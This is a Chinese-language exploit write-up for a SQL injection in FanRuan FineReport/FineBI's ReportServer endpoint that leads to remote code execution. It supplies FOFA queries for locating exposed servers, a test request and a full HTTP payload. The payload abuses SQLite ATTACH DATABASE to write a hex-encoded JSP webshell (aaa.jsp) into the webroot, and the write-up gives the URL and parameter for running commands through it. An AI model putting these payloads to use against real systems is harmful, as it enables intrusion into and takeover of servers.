# 帆软系统ReportServer存在SQL注入漏洞导致RCE

帆软工具软件存在RCE
访问URL:/webroot/decision/view/ReportServer?test=&n=，可执行GET参数n中的SQL语句，该漏洞是由于帆软自带的sqlite-jdbc-x.x.x.x.jar驱动导致。影响范围：FineReport和FineBI所有版本产品。HW爆出的day，没有复现

## fofa

```yaml
body="isSupportForgetPwd"
app="帆软-FineReport"
```

## poc

```java
GET /webroot/decision/view/ReportServer?test=&n=${9*9}
HTTP/1.1
Host: 192.168.174.152:8075
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0)Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer:http://192.168.174.152:8075/webroot/decision/login?origin=1dc5fbd4-27eb-41b5-a43f-0623003685b4
Cookie: tenantId=default
```

![image-20240725213005972](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252130095.png)

## 写文件

注：打过一次之后还要再打的话要改下数据库名称

```java
GET /webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Faaa.jsp%27%20as%20gggggg%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20gggggg.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20gggggg.exp2%28data%29%20VALUES%20%28x%27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d%27%29%3B'),1,1)} HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

`http://127.0.0.1:8080/webroot/aaa.jsp?a=javax.script.ScriptEngineManager` 密码 b 

![image-20240725213111459](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252131536.png)



## 参考文章

- https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/
- https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ
